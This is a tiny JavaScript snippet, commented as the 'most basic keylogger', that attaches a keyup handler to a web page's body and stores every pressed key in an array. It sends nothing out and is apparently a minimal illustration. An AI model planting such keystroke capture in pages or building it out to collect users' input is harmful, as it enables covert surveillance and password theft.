// most basic keylogger

var keylogger = [];
document.body.onkeyup = function(e){keylogger.push(e.key);};